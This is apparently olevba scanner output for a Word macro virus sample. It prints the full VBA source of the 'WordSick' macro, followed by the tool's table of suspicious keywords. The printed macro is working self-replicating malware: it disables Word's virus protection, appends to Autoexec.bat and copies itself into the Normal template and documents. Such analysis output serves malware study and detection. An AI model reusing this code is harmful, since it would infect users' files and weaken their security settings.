olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Fool.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Fool.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordSick.bas 
in file: ./Virus.MSWord.Fool.e - OLE stream: 'Macros/VBA/WordSick'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
    'WordSick Virus v1.00
    'The WaLRuS 05/00
    On Error Resume Next
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    ActiveDocument.ReadOnlyRecommended = False
    SetAttr "C:\Autoexec.bat", 0
    Open "C:\Autoexec.bat" For Append As #1
    Print #1, "ECHO                    Help Me Im Sick     "
    Close #1
Finish:
If (Second(Now()) > 50) Then Call HelpCall
    Set Norm = NormalTemplate.VBProject.VBComponents
    Set Doc = ActiveDocument.VBProject.VBComponents
If Norm.Item("WordSick").Name <> "WordSick" Then
    Doc("WordSick").Export "c:\WordSick.drv"
    Set infect = NormalTemplate.VBProject
ElseIf Doc.Item("WordSick").Name <> "WordSick" Then
    Norm("WordSick").Export "c:\WordSick.drv"
    Set infect = ActiveDocument.VBProject
End If
infect.VBComponents.Import ("c:\WordSick.drv")
ActiveDocument.Save
End Sub

Sub HelpCall()
    On Error Resume Next
    MsgBox "Please Help Me Im Sick", vbInformation
    Assistant.Visible = True
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "Please Help Me Im Sick"
    .Heading = "HELP"
    .Show
    End With
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

